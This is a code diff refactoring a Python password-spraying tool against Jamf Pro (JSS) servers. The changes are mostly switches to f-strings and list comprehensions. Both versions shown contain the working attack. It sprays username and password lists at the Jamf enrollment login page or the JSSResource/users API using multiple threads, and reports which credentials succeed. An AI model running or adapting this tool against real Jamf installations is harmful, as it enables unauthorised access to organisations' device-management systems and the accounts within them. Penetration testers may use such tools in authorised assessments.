@@ -30,23 +30,34 @@ headers = {
 
 def print_debug(msg):
     if args.debug:
-        print((bcolors.OKBLUE + "[%] %s" + bcolors.ENDC) % msg)
+        print(f"{bcolors.OKBLUE}[%] %s{bcolors.ENDC}" % msg)
 
 def do_authentication(username, password):
-    data = 'lastPage=login.jsp&payload=&device-detect-complete=&username={}&password={}'.format(username, password)
+    data = f'lastPage=login.jsp&payload=&device-detect-complete=&username={username}&password={password}'
+
     r = requests.post(args.jss, headers=headers, data=data, verify=False, allow_redirects=False)
 
     if r.status_code == 302:
-        tqdm.write(("[*] %s:%s " + bcolors.OKGREEN + "(success)" + bcolors.ENDC) % (username, password))
+        tqdm.write(
+            f"[*] %s:%s {bcolors.OKGREEN}(success){bcolors.ENDC}"
+            % (username, password)
+        )
 
 def do_authentication_api(username, password):
     r = requests.get(api_url, headers=headers, auth=(username, password), verify=False)
-    
+
     if "WWW-Authenticate" not in r.headers:
         if "Unauthorized" in r.text:
-            tqdm.write(("[*] %s:%s " + bcolors.OKGREEN + "(success)" + bcolors.ENDC) % (username, password))
+            tqdm.write(
+                f"[*] %s:%s {bcolors.OKGREEN}(success){bcolors.ENDC}"
+                % (username, password)
+            )
+
         else:
-            tqdm.write(("[*] %s:%s " + bcolors.OKGREEN + "(success - API access)" + bcolors.ENDC) % (username, password))
+            tqdm.write(
+                f"[*] %s:%s {bcolors.OKGREEN}(success - API access){bcolors.ENDC}"
+                % (username, password)
+            )
     
         
 parser = argparse.ArgumentParser(description="Password Spray a target\'s Jamf installation.")
@@ -64,7 +75,7 @@ args = parser.parse_args()
 if not args.jss.endswith("/"):
     args.jss += "/"
 
-api_url = args.jss + "JSSResource/users"
+api_url = f"{args.jss}JSSResource/users"
 args.jss += "enroll/"
 
 if args.username is None and args.username_list is None:
@@ -86,22 +97,22 @@ else:
         passwords = [x.strip() for x in f.readlines()]
 
 if args.api:
-    print("[*] JSS API URL: %s" % api_url)
+    print(f"[*] JSS API URL: {api_url}")
 else:
-    print("[*] JSS URL: %s" % args.jss)
+    print(f"[*] JSS URL: {args.jss}")
 
 try:
     s = requests.Session()
     r = s.get(args.jss, headers=headers, verify=False)
 
     if r.status_code == 200:
-        print("[*] Status: " + bcolors.OKGREEN + "Up" + bcolors.ENDC)
-        
+        print(f"[*] Status: {bcolors.OKGREEN}Up{bcolors.ENDC}")
+
     else:
         raise Exception("Initial checks returned HTTP status code: %i." % r.status_code)
 except Exception as e:
-    print("[!] Status: " + bcolors.FAIL + "Down or Unreachable" + bcolors.ENDC)
-    print("[!] Error: %s" % e)
+    print(f"[!] Status: {bcolors.FAIL}Down or Unreachable{bcolors.ENDC}")
+    print(f"[!] Error: {e}")
     sys.exit()
 
 
@@ -110,35 +121,33 @@ print("[*] Attempting authentication requests for %i usernames with %i passwords
 confirmation = input("[?] Ready? [y/N] ")
 
 if confirmation.lower() != "y":
-    print("[!] " + bcolors.FAIL + "Aborting" + bcolors.ENDC)
+    print(f"[!] {bcolors.FAIL}Aborting{bcolors.ENDC}")
     sys.exit()
 
-if args.api:
-    auth_function = do_authentication_api
-else:
-    auth_function = do_authentication
-
+auth_function = do_authentication_api if args.api else do_authentication
 if args.swap:
     for i, username in enumerate(usernames):
         print("[*] Attempting '%s' (%i/%i)" % (username, i + 1, len(usernames)))
 
         p = ThreadPoolExecutor(max_workers=int(args.threads))
-        futures = []
+        futures = [
+            p.submit(auth_function, username, password)
+            for password in passwords
+        ]
 
-        for password in passwords:
-            futures.append(p.submit(auth_function, username, password))
-            
-        for f in tqdm(as_completed(futures), leave=True, total=len(futures)):
+
+        for _ in tqdm(as_completed(futures), leave=True, total=len(futures)):
             pass
 else:
     for i, password in enumerate(passwords):
         print("[*] Attempting '%s' (%i/%i)" % (password, i + 1, len(passwords)))
 
         p = ThreadPoolExecutor(max_workers=int(args.threads))
-        futures = []
+        futures = [
+            p.submit(auth_function, username, password)
+            for username in usernames
+        ]
 
-        for username in usernames:
-            futures.append(p.submit(auth_function, username, password))
-            
-        for f in tqdm(as_completed(futures), leave=True, total=len(futures)):
+
+        for _ in tqdm(as_completed(futures), leave=True, total=len(futures)):
             pass
